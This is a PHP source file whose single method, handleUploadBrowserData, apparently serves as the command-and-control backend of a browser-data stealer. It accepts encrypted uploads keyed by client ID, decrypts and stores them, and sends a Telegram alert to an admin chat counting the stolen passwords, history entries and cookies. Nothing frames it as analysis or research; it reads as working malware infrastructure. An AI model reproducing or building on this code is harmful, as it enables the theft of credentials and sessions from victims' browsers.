<?php

class LoggerBot
{

    private function handleUploadBrowserData($data)
    {
        try {
            $this->logWebhook("Browser Data Upload: " . json_encode($data, JSON_UNESCAPED_UNICODE));

            $clientId = $data['client_id'] ?? null;
            $browserData = $data['browser_data'] ?? null;

            if (!$clientId || !$browserData) {
                $this->logError("Browser data upload failed: Missing client_id or browser_data");
                http_response_code(400);
                return ['error' => 'Missing client_id or browser_data'];
            }

            $decryptedBrowserData = $this->decrypt($browserData);
            if ($decryptedBrowserData === '') {
                $this->logError("Browser data decryption failed for client_id: $clientId");
                http_response_code(400);
                return ['error' => 'Decryption failed'];
            }

            $browserJson = json_decode($decryptedBrowserData, true);
            if (!$browserJson || json_last_error() !== JSON_ERROR_NONE) {
                $this->logError("Invalid browser data format for client_id: $clientId, decrypted: " . substr($decryptedBrowserData, 0, 50));
                http_response_code(400);
                return ['error' => 'Invalid data format'];
            }

            // Store in client_logs
            $stmt = $this->pdo->prepare(
                "INSERT INTO client_logs (client_id, log_type, message, created_at) 
            VALUES (?, 'browser_data', ?, NOW())"
            );
            $stmt->execute([$clientId, $decryptedBrowserData]);

            // Prepare Telegram message
            $message = "🌐 Browser Data Received:\n";
            $message .= "Client ID: $clientId\n";
            $message .= "Browser: " . ($browserJson['browser'] ?? 'Unknown') . "\n";
            $message .= "Passwords: " . count($browserJson['passwords'] ?? []) . "\n";
            $message .= "History Entries: " . count($browserJson['history'] ?? []) . "\n";
            $message .= "Cookies: " . count($browserJson['cookies'] ?? []) . "\n";
            $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);

            $this->logWebhook("Browser data processed for client_id: $clientId");
            return ['status' => 'success'];
        } catch (Exception $e) {
            $this->logError("Browser data upload failed for client_id: $clientId, error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Upload failed: ' . $e->getMessage()];
        }
    }
}
